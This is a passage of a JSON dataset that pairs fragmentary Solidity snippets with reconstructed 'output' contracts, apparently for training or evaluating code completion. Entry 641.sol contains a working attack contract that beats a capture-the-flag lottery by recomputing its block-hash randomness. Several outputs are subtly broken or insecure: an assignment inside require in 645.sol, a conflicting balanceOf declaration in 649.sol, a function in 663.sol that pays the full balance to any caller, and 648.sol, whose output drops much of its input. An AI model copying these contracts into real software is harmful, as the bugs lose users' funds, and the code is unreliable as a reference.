        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping(address => uint256) public balances;\n    address public liquidityPoolOwnerAddress;\n    address public liquidityPoolAddress;\n\n    constructor(address _liquidityPoolOwnerAddress, address _liquidityPoolAddress) {\n        liquidityPoolOwnerAddress = _liquidityPoolOwnerAddress;\n        liquidityPoolAddress = _liquidityPoolAddress;\n    }\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n    function totalSupply() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function _mint(address _to, uint256 _amount) internal {\n        require(_to != address(0), \"Cannot mint tokens to the zero address\");\n        balances[_to] += _amount;\n        emit Transfer(address(0), _to, _amount);\n    }\n\n    function buyTokens(uint256 amount) external {\n        _mint(msg.sender, (98 * amount)/100);\n        _mint(liquidityPoolOwnerAddress, amount/100);\n        _mint(liquidityPoolAddress, amount/100);\n    }\n}\n\n",
        "changed": 1
    },
    "638.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2][2] public fixedArray;\n    uint[][] public dynamicArray;\n\n    constructor() {\n        fixedArray[0][0] = 1;\n        fixedArray[0][1] = 2;\n        fixedArray[1][0] = 3;\n        fixedArray[1][1] = 4;\n\n        uint[] memory dynamicArrayNested1 = new uint[](2);\n        dynamicArrayNested1[0] = 5;\n        dynamicArrayNested1[1] = 6;\n        dynamicArray.push(dynamicArrayNested1);\n        uint[] memory dynamicArrayNested2 = new uint[](2);\n        dynamicArrayNested2[0] = 7;\n        dynamicArrayNested2[1] = 8;\n        dynamicArray.push(dynamicArrayNested2);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint[2][2] public fixedArray;\n    uint[][] public dynamicArray;\n\n    constructor() {\n        fixedArray[0][0] = 1;\n        fixedArray[0][1] = 2;\n        fixedArray[1][0] = 3;\n        fixedArray[1][1] = 4;\n\n        // workaround - cannot resize in-memory dynamic-size arrays\n        // so we declare a \"dynamic array with predefined length\" in memory\n        uint[] memory dynamicArrayNested1 = new uint[](2);\n        dynamicArrayNested1[0] = 5;\n        dynamicArrayNested1[1] = 6;\n        dynamicArray.push(dynamicArrayNested1);\n        uint[] memory dynamicArrayNested2 = new uint[](2);\n        dynamicArrayNested2[0] = 7;\n        dynamicArrayNested2[1] = 8;\n        dynamicArray.push(dynamicArrayNested2);\n    }\n}\n\n",
        "changed": 0
    },
    "639.sol": {
        "input": "contract ConcertTicketReservationFactory {\n    function create() public {\n        ConcertTicketReservation reservationContract = new ConcertTicketReservation();\n\n        address reservationContractAddress = address(reservationContract);\n\n        string memory choice = reservationContract.getChoice();\n\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ConcertTicketReservation {\n    function getChoice() public returns(string memory) {\n        return \"Your choice\";\n    }\n}\n\ncontract ConcertTicketReservationFactory {\n    function create() public {\n        ConcertTicketReservation reservationContract = new ConcertTicketReservation();\n        address reservationContractAddress = address(reservationContract);\n        string memory choice = reservationContract.getChoice();\n    }\n}\n\n",
        "changed": 0
    },
    "640.sol": {
        "input": "mapping(uint256 => address) public staked;\nmapping(address => uint256[]) stakedByAdddress;\n\nfunction stake(uint256[] memory tokenIds) external {\n    staked[tokenIds[i]] = msg.sender;\n    stakedByAdddress[msg.sender].push(tokenIds[i]);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Staking {\n    mapping(uint256 => address) public staked;\n    mapping(address => uint256[]) public stakedByAddress;\n\n    function stake(uint256[] memory tokenIds) public {\n        for(uint i = 0; i < tokenIds.length; i++) {\n            staked[tokenIds[i]] = msg.sender;\n            stakedByAddress[msg.sender].push(tokenIds[i]);\n        }\n    }\n\n    function getStakedTokens(address user) public view returns(uint256[] memory) {\n        return stakedByAddress[user];\n    }\n}\n\n",
        "changed": 1
    },
    "641.sol": {
        "input": "pragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge {\n\n    function GuessTheNewNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n\ncontract Attack {\n    GuessTheNewNumberChallenge private gn;\n\n    constructor(address gtncAddress) public {\n        gn = GuessTheNewNumberChallenge(gtncAddress);\n    } \n\n    function attack() public {\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n        gn.guess(answer);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge {\n\n    function GuessTheNewNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n\ncontract Attack {\n    // I declare variable refers to GuessTheNewNumberChallenge\n    GuessTheNewNumberChallenge private gn;\n\n    // I set into constructor about this smart contract the address where GuessTheNewNumberChallenge deployed.\n    // And when the instance is complete, you can use the GuessTheNewNumberChallenge functions. \n    constructor(address gtncAddress) public {\n        gn = GuessTheNewNumberChallenge(gtncAddress);\n    } \n\n    function attack() public {\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n        gn.guess(answer);\n    }\n}\n\n",
        "changed": 0
    },
    "642.sol": {
        "input": "contract ERC20FixedSupply is ERC20 {\n  constructor() ERC20(\"Fixed\", \"FIX\") {\n      _mint(msg.sender, 1000);\n  }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "644.sol": {
        "input": "pragma solidity 0.8.15;\n\nimport \"./MainContract.sol\";\n\ncontract Logger {  \n   address private owner;\n   MainContract mainContract;\n   constructor(address _mainContract){\n       owner = msg.sender;\n       mainContract = new MainContract(_mainContract);\n   }\n   function log(address _caller, uint _amount, string memory _action, uint256 value) public {\n        if (equal(_action, \"withdraw\")) {\n        }\n        else if (_caller == owner){\n            mainContract.action(value);\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMainContract {\n    function action(uint256 value) external;\n}\n\ncontract Logger {  \n   address private owner;\n   IMainContract mainContract;\n   constructor(address _mainContract){\n       owner = msg.sender;\n       mainContract = IMainContract(_mainContract);\n   }\n   function log(address _caller, uint _amount, string memory _action, uint256 value) public {\n        require(_caller == owner, \"Only owner can call this function.\");\n        if (equal(_action, \"withdraw\")) {\n            // Implement withdraw action here\n        }\n        else {\n            mainContract.action(value);\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encodePacked(_a)) == keccak256(abi.encodePacked(_b));\n    }\n}\n",
        "changed": 0
    },
    "645.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract Timer{\n    \n    uint256 public initialSupply = 1000 * (10 ** 18);\n    uint256 public ts_end;\n    address public wallet = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n    address public owner;\n    bool public claimed;\n    mapping (address => uint256) public balances;\n\n    modifier onlyOwner() {\n        require(owner == msg.sender);\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n        balances[wallet] = initialSupply;\n        ts_end = block.timestamp + (86400 * 30 * 12);\n        \n    }\n\n    function claim() public onlyOwner {\n        require(ts_end > block.timestamp,\"Can not claim yet\");\n        require(claimed = false,\"Already claimed\");\n        claimed = true;\n\n        for(uint i = 0 ; i < 12 ; i++) {\n            initialSupply += (initialSupply * 15) / 100;\n        }\n        balances[wallet] = initialSupply;\n    }\n\n    function balanceOf() external view returns(uint256) {\n        return balances[msg.sender];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract Timer{\n    /* \n       @param initialSupply : adding 18 decimals to avoid fraction \n    */\n    uint256 public initialSupply = 1000 * (10 ** 18);\n    uint256 public ts_end;\n    address public wallet = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;\n    address public owner;\n    bool public claimed;\n    mapping (address => uint256) public balances;\n\n    modifier onlyOwner() {\n        require(owner == msg.sender);\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n        balances[wallet] = initialSupply;\n        /* Assuming a year with 365-days , i.e no leep year */\n        ts_end = block.timestamp + (86400 * 30 * 12);\n        \n    }\n\n    function claim() public onlyOwner {\n        require(ts_end > block.timestamp,\"Can not claim yet\");\n        require(claimed = false,\"Already claimed\");\n        claimed = true;\n\n        for(uint i = 0 ; i < 12 ; i++) {\n            initialSupply += (initialSupply * 15) / 100;\n        }\n        balances[wallet] = initialSupply;\n    }\n\n    function balanceOf() external view returns(uint256) {\n        return balances[msg.sender];\n    }\n\n}\n\n",
        "changed": 0
    },
    "646.sol": {
        "input": "(bool success, ) = address(token).call{value: 0 ether, gas: 90000}(abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", sender, address(this), _tokenAmount));\nrequire(success, \"transferfrom of token failed\");\n\n(bool success, ) = USDCADDRESS.call{value: 0 ether, gas: 70000}(abi.encodeWithSignature(\"transfer(address,uint256)\", destinationAddress, _tokenAmount));\nrequire(success, \"transfer failed\");```\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ExampleContract {\n    address private token;\n    address private USDCADDRESS;\n\n    constructor(address _token, address _USDCADDRESS) {\n        token = _token;\n        USDCADDRESS = _USDCADDRESS;\n    }\n\n    function executeTransferFrom(address sender, uint256 _tokenAmount) public {\n        (bool success, ) = address(token).call{value: 0 ether, gas: 90000}(abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", sender, address(this), _tokenAmount));\n        require(success, \"transferFrom of token failed\");\n    }\n\n    function executeTransfer(address destinationAddress, uint256 _tokenAmount) public {\n        (bool success, ) = USDCADDRESS.call{value: 0 ether, gas: 70000}(abi.encodeWithSignature(\"transfer(address,uint256)\", destinationAddress, _tokenAmount));\n        require(success, \"transfer failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "647.sol": {
        "input": "function addToVIP(address[] calldata toAddAddresses) external onlyOwner\n    {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n            \n        }\n    }\n\nfunction addToVIP(address[] calldata toAddAddresses) external onlyOwner\n    {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n            vip.push(toAddAddresses[i]);\n        }\n    }\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VIPList {\n    address public owner;\n    mapping(address => bool) public monthlyVIP;\n    address[] public vip;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Not contract owner\");\n        _;\n    }\n\n    function addToVIP(address[] calldata toAddAddresses) external onlyOwner {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n        }\n    }\n\n    function addToVIPandList(address[] calldata toAddAddresses) external onlyOwner {\n        for (uint i = 0; i < toAddAddresses.length; i++) {\n            monthlyVIP[toAddAddresses[i]] = true;\n            vip.push(toAddAddresses[i]);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "648.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Vehicle {\n    function turnRight() virtual external {\n        turnSteeringWheel();\n    }\n}\n\ncontract Car is Vehicle {\n}\n\ncontract Motorbike is Vehicle {\n    function turnRight() override external {\n        turnHandlebar();\n    }\n}\n\npragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract MyContract is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MyT\") {}\n\n    function decimals() override public pure returns (uint8) {\n        return 2;\n    }\n}\n\npragma solidity ^0.8;\n\ncontract Parent {\n    function foo() virtual public pure returns (uint) {\n        return 1;\n    }\n}\n\ncontract Child is Parent {\n    function foo() override public pure returns (uint) {\n        return 2;\n    }\n}\n\ncontract Child2 is Parent {\n    function foo() override public pure returns (uint) {\n        uint returnedFromParent = super.foo();\n\n        return returnedFromParent + 1;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Vehicle {\n    function turnSteeringWheel() internal pure {}\n    function turnHandlebar() internal pure {}\n\n    function turnRight() virtual external {\n        turnSteeringWheel();\n    }\n}\n\ncontract Parent {\n    function foo() virtual public pure returns (uint) {\n        return 1;\n    }\n}\n\n",
        "changed": 1
    },
    "649.sol": {
        "input": "pragma solidity ^0.5.0;\n\ncontract('Token', ([deployer, receiver]) => { \n\n const name = 'Arv Token';\n const symbol = 'ARVV';\n const decimals = '18';\n const totalSupply = tokens(1000000).toString();\n let token\n\n    beforeEach(async () => {\n        token = await Token.new();\n    })\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balanceOf;\n\n    constructor() public {\n        name = \"Arv Token\";\n        symbol = \"ARVV\";\n        decimals = 18;\n        totalSupply = 1000000 * (10 ** uint256(decimals));\n        balanceOf[msg.sender] = totalSupply;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balanceOf[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "650.sol": {
        "input": "    function placeBet(Game.Teams x) external payable returns (uint256) {\n        int256 _diff = getScoreDifference(x);\n        return calculatePayout(msg.value, _diff);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BettingGame {\n    enum Teams {\n        Team1,\n        Team2\n    }\n\n    struct Game {\n        Teams team;\n        uint256 score1;\n        uint256 score2;\n    }\n\n    Game public game;\n\n    function placeBet(Teams x) external payable returns (uint256) {\n        int256 _diff = getScoreDifference(x);\n        return calculatePayout(msg.value, _diff);\n    }\n\n    function getScoreDifference(Teams x) public view returns (int256) {\n        if (x == Teams.Team1) {\n            return int256(game.score1) - int256(game.score2);\n        } else {\n            return int256(game.score2) - int256(game.score1);\n        }\n    }\n\n    function calculatePayout(uint256 _value, int256 _diff) public pure returns(uint256) {\n        return _value + uint256(_diff > 0 ? _diff : -_diff);\n    }\n}\n\n",
        "changed": 0
    },
    "651.sol": {
        "input": " safeTransferFrom(seller, msg.sender, _tokenId);\n\nfunction _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual {\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;    \n        emit Transfer(from, to, tokenId);    \n        _afterTokenTransfer(from, to, tokenId);\n    }\n\nfunction _approve(address to, uint256 tokenId) internal virtual {\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "652.sol": {
        "input": "address previousOwner;\n\nfunction reclaimOwnership() external {\n    require(msg.sender == previousOwner);\n    owner = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownership {\n    address public owner;\n    address private previousOwner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function transferOwnership(address newOwner) public {\n        require(msg.sender == owner);\n        previousOwner = owner;\n        owner = newOwner;\n    }\n\n    function reclaimOwnership() external {\n        require(msg.sender == previousOwner);\n        owner = msg.sender;\n    }\n}\n\n",
        "changed": 0
    },
    "653.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract MyCollection is ERC721 {\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(msg.sender, 1);\n    }\n\n    function _baseURI() internal pure override returns (string memory) {\n        return \"https:\n    }\n\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        string memory uri = super.tokenURI(tokenId);\n        return string(abi.encodePacked(uri, \".json\"));\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "656.sol": {
        "input": "IERC20(ERC20Token).approve(marketItem[_tokenId].seller, _price);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract Market {\n    struct MarketItem {\n        address seller;\n        uint256 price;\n    }\n\n    IERC20 public ERC20Token;\n    mapping(uint256 => MarketItem) public marketItem;\n\n    constructor (IERC20 _ERC20Token) public {\n        ERC20Token = _ERC20Token;\n    }\n\n    function listMarketItem(uint256 _tokenId, address _seller, uint256 _price) public {\n        MarketItem memory newItem = MarketItem({\n            seller: _seller,\n            price: _price\n        });\n        marketItem[_tokenId] = newItem;\n    }\n\n    function approveMarketItem(uint256 _tokenId, uint256 _price) public {\n        require(marketItem[_tokenId].seller != address(0), \"Item not exist\");\n        IERC20(ERC20Token).approve(marketItem[_tokenId].seller, _price);\n    }\n}\n\n",
        "changed": 0
    },
    "657.sol": {
        "input": "    function getIndex(A memory [] arr, string memory _id) internal view returns (uint256){\n        cases\n        return 0;\n    }\n    \n    function getIndex(B memory [] arr, string memory _id) internal view returns (uint256){\n        cases\n        return 0;\n    }\n\n   function _commonFunction(xxx) internal {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n    struct A {\n        string id;\n    }\n\n    struct B {\n        string id;\n    }\n\n    function getIndex(A[] memory arr, string memory _id) internal pure returns (uint256) {\n        for (uint i=0; i<arr.length; i++) {\n            if (keccak256(abi.encodePacked((arr[i].id))) == keccak256(abi.encodePacked((_id)))) {\n                return i;\n            }\n        }\n        return arr.length;\n    }\n\n    function getIndex(B[] memory arr, string memory _id) internal pure returns (uint256){\n        for (uint i=0; i<arr.length; i++) {\n            if (keccak256(abi.encodePacked((arr[i].id))) == keccak256(abi.encodePacked((_id)))) {\n                return i;\n            }\n        }\n        return arr.length;\n    }\n\n    function _commonFunction() internal pure {}\n}\n\n",
        "changed": 0
    },
    "658.sol": {
        "input": "address payable contractAddress = payable(address(this));\ncontractAddress.transfer(nftCost);\n\ncontract MyContract {\n    receive() external payable {\n    }\n}\n\nconst tx = await this.nft.connect(this.normalUser).safeMintNft({\n    value: ethers.utils.parseEther(\"0.1\")\n});\n\nfunction safeMintNft() public payable whenNotPaused {\n    require(msg.value == nftCost);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public nftCost;\n    bool public paused;\n\n    constructor() public {\n        nftCost = 0.1 ether; // Set NFT Cost\n        paused = false; // Set Contract to Active State\n    }\n\n    modifier whenNotPaused() {\n        require(!paused, \"Contract is paused\");\n        _;\n    }\n\n    function safeMintNft() public payable whenNotPaused {\n        require(msg.value == nftCost, \"Incorrect value sent\");\n\n        // Transfer the NFT cost to the contract address\n        address payable contractAddress = payable(address(this));\n        contractAddress.transfer(nftCost);\n    }\n\n    receive() external payable {}\n\n    // Function to pause the contract\n    function pause() public {\n        paused = true;\n    }\n\n    // Function to unpause the contract\n    function unpause() public {\n        paused = false;\n    }\n}\n\n",
        "changed": 0
    },
    "659.sol": {
        "input": "import \"@openzeppelin/contracts/ownership/Ownable.sol\";\n\ncontract A is Ownable {\n\n    bool public dummy;\n\n    function setDummy (bool x) public onlyOwner {\n        dummy = x;\n    }\n\n    function getDummy () public view returns (bool) {\n        return dummy;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "660.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract Prontuario {\n    struct Evolucao {\n        string categoria;\n        string titulo;\n        string descricao;\n        string data;\n    }\n\n    mapping(uint256 => Evolucao) public evolucoes;\n    uint256 private index;\n\n    function addEvolucao(Evolucao memory _evolucao) public {\n        evolucoes[index] = _evolucao;\n        index += 1;\n    }\n\n    function getAllEvolucoes() public view returns (Evolucao[] memory) {\n        Evolucao[] memory ret = new Evolucao[](index);\n        for (uint i = 0; i < index; i++) {\n            ret[i] = evolucoes[i];\n        }\n        return ret;\n     }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract Prontuario {\n    struct Evolucao {\n        string categoria;\n        string titulo;\n        string descricao;\n        string data;\n    }\n\n    mapping(uint256 => Evolucao) public evolucoes;\n    uint256 private index;\n\n    function addEvolucao(Evolucao memory _evolucao) public {\n        evolucoes[index] = _evolucao;\n        index += 1;\n    }\n\n    function getAllEvolucoes() public view returns (Evolucao[] memory) {\n        Evolucao[] memory ret = new Evolucao[](index);\n        for (uint i = 0; i < index; i++) {\n            ret[i] = evolucoes[i];\n        }\n        return ret;\n     }\n}\n\n",
        "changed": 0
    },
    "661.sol": {
        "input": "function getAll() external pure returns (uint8, bool) {\n    return (1, true);\n}\n\nconst returnedValues = await contract.getAll(); \nconst number = returnedValues[0];\nconst status = returnedValues[1];\n\nfunction getAll() external pure returns (uint8 number, bool status) {\n    return (1, true);\n}\n\nconst returnedValues = await contract.getAll(); \nconst number = returnedValues.number;\nconst status = returnedValues.status;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint8 number;\n    bool status;\n\n    function getAll() external view returns (uint8, bool) {\n        return (number, status);\n    }\n    \n    function setAll(uint8 _number, bool _status) external {\n        number = _number;\n        status = _status;\n    }\n}\n\n",
        "changed": 0
    },
    "662.sol": {
        "input": "for (address wallet in balances) {\n\nfor (uint i = 0; i < balances.length; i++) {\n\nmapping(address => uint256) balancePercentages;\n\nuint256 multiplier;\n\nfunction rebase(uint256 _multiplier) external {\n    multiplier = _multiplier;\n}\n\nfunction balanceOf(address holder) external view returns (uint256) {\n    return balancePercentages * multiplier;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping(address => uint256) private balances;\n    uint256 private multiplier;\n\n    function rebase(uint256 _multiplier) external {\n        multiplier = _multiplier;\n    }\n\n    function deposit(uint256 amount) public {\n        balances[msg.sender] += amount;\n    }\n\n    function balanceOf(address holder) external view returns (uint256) {\n        return balances[holder] * multiplier;\n    }\n}\n\n",
        "changed": 1
    },
    "663.sol": {
        "input": "(bool success, bytes memory data) = msg.sender.call{value: balance}(\"\");\n\n(bool success, )\n\ncontract.call.value(...)(...)\n\n{value: balance, gas: 1000000}\n\nmsg.sender.call{value: balance}(abi.encodeWithSignature(\"test(uint,address)\", 1, msg.sender))\n\n(bool success, ) = owner.call{value: item.price}(\"\");\nrequire(success, \"Transfer failed\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable owner;\n    \n    struct Item {\n        uint price;\n    }\n\n    Item public item;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function setItemPrice(uint _price) public {\n        item.price = _price;\n    }\n\n    function buyItem() public payable {\n        require(msg.value >= item.price, \"Insufficient funds to buy the item\");\n\n        (bool success, ) = owner.call{value: item.price}(\"\");\n        require(success, \"Transfer failed\");\n    }\n\n    function test(uint _num, address _addr) public {\n        // Function logic here\n    }\n\n    function callTestFunction() public {\n        (bool success, bytes memory data) = msg.sender.call{value: address(this).balance}(abi.encodeWithSignature(\"test(uint,address)\", 1, msg.sender));\n        require(success, \"Call failed\");\n    }\n\n    fallback() external payable {\n        // Custom logic here\n    }\n}\n\n",
        "changed": 0
    },
    "665.sol": {
        "input": "function myFunction(address admin) external view returns (bool) {\n   return adminMembers[address]._isDeleted;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Admin {\n        bool _isDeleted;\n    }\n\n    mapping(address => Admin) public adminMembers;\n\n    function myFunction(address admin) external view returns (bool) {\n       return adminMembers[admin]._isDeleted;\n    }\n}\n\n",
        "changed": 0
    },
    "667.sol": {
        "input": "pragma solidity ^0.8.15;\n\nerror InvalidAmount (uint256 sent, uint256 minRequired);\n\ncontract C {\n    uint32 public num;\n    address public sender;\n\n    function setVars(uint32 _num) public {\n        if (_num < 5) {\n            revert InvalidAmount({\n                sent: _num,\n                minRequired: 5\n            });\n        }\n        num = _num;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "668.sol": {
        "input": "contract B {\n    address payable a;\n\n    constructor() {\n        a = payable(0xE9F920eE6F15739cc3b2Ac5Ea862C6eB9EEE529b);\n    }\n\n    function fund() public payable {\n        a.call{value: msg.value}(\"\");\n    }\n}\n\n\n",
        "output": "contract B {\n    address payable a;\n\n    constructor() {\n        a = payable(0xE9F920eE6F15739cc3b2Ac5Ea862C6eB9EEE529b);\n    }\n\n    function fund() public payable {\n        a.call{value: msg.value}(\"\");\n    }\n}\n\n",
        "changed": 0
    },
    "669.sol": {
        "input": " * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behaviour in high-level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\nlibrary SafeMath {\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    \n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    \n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    \n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    \n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    \n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    \n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    \n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    \n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    \n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    \n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    \n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n",
        "changed": 0
    },
    "670.sol": {
        "input": "modifier mintCompliance(uint256 _mintAmount) {\n    if(!presale){\n      require(_mintAmount > 0 && _mintAmount <= maxMintAmountPerTx, \"Invalid mint amount!\");\n      require(supply.current() + _mintAmount <= maxSupply, \"Max supply exceeded!\");\n      _;\n    }else{\n      require(_mintAmount > 0 && _mintAmount <= maxMintAmountPerTx, \"Invalid mint amount!\");\n      require(supply.current() + _mintAmount <= maxPresaleSupply, \"Max supply exceeded!\");\n      _;\n    }\n  }\n\nfunction mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) {\n      require(!paused, \"The contract is paused!\");\n      require(msg.value >= cost * _mintAmount, \"Insufficient funds!\");\n\n    if (msg.sender != owner()) {\n        if(onlyWhitelisted == true) {\n            require(isWhitelisted(msg.sender), \"user is not whitelisted\");\n    }\n    require(msg.value >= cost * _mintAmount, \"insufficient funds\");\n    }\n\n    _mintLoop(msg.sender, _mintAmount);\n} \n\nfunction mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) whenNotPaused {}\n\nrequire(!paused, \"The contract is paused!\");\n\n\n",
        "output": "",
        "changed": 0
    },
    "671.sol": {
        "input": "  function onTransferReceived(\n    address from,\n    uint tokensPaid,\n    bytes4 selector\n  ) public acceptedTokenOnly {\n    if (selector == this.purchase.selector) {\n      purchase(from, tokensPaid);\n    } else {\n      revert(\"Call of an unknown function\");\n    }\n  }\n\n\n",
